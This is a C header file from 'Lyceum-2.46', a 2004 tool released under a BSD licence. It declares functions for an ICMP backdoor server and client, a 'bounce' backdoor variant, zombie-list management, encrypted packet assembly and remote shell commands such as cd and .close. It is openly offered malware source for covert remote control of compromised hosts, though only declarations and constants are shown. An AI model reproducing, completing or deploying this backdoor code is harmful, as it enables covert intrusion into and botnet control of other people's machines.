
/* 
 * Lyceum-2.46
 *
 * Copyright (c) 2004 phish <phish@hush.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the
 *    documentation and/or other materials provided with the
 *    distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS
 * IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS
 * BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */




char *s_icmp_pkt (char *);	/* Packet assembly */
char *c_icmp_pkt (char *,unsigned long);	/* Packet assembly */
int icmp_backdoor_connect(unsigned long, unsigned long,char *,unsigned long,int);
int icmp_backdoord(char *,int);

int icmp_bounce_backdoord(void);
int icmp_bounce_backdoor_connect(unsigned long, unsigned long,unsigned long);

unsigned long zombie_update(unsigned long);
void zombie_list_init(char *);	

void print_icmp_types(void);

#define EXIT ".exit"		/* Close client */
#define CLOSE ".close"		/* Close client && server */
#define CD "cd"			/* change dir */
#define CLEAR ".clear"		/* clear        */

#define LZ ".lz"
#define LZL ".llz"
#define TSZ ".tsz"

#define ENCRYPT 0
#define DECRYPT 1		/* boolean encrypt args */

#define ICMP_TIMEOUT 6
